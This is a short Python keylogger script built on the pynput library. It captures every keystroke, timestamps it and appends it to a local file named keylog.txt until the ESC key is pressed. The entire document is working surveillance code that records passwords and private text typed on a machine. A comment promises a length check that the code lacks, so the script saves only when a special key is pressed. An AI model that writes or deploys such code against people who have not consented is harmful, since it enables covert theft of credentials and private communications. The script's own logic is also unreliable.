from pynput import keyboard
import os
from datetime import datetime

#  the name of the log file
log_file = "keylog.txt"

#  an empty string to store keystrokes
log = ""

#  function to save the log data
def save_log(log_data):
    # gets the current time as a formatted string
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    # combines the timestamp and the log data
    full_log = f"{timestamp} {log_data}"

    # opens the log file in append modee
    with open(log_file, "a") as f:
        # writes the full log entry followed by a newline
        f.write(full_log + "\n")

def on_press(key):
    # uses the global log variable
    global log
    try:
        # tries to append the character of the key
        log += key.char
    except AttributeError:
        # handling special keys 
        if key == keyboard.Key.space:
            # appends a space character
            log += " "
        elif key == keyboard.Key.enter:
            # appends a newline character
            log += "\n"
        elif key == keyboard.Key.tab:
            # appends a tab character
            log += "\t"
        else:
            # for other special keys, appends the key's name in brackets
            log += f"[{key.name}]"

    # check for  length of the log file and reset it if it is too long 
        # saves the current log buffer to the file
        save_log(log)
        # resets the log buffer
        log = ""

# defines the function to handle key releases
def on_release(key):
    # checks if the escape key was released
    if key == keyboard.Key.esc:
        # if there's anything left in the log buffer
        if log:
            # save it before exiting
            save_log(log)
        # prints a message to the console
        print("[*] Keylogger stopped.")
        # stops the listener
        return False

print(f"[*] Keylogger started. Logs will be saved to: {os.path.abspath(log_file)}")
print("[*] Press ESC to stop.")

# creates a keyboard listener instance
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # starts the listener and waits for it to stop
    listener.join()
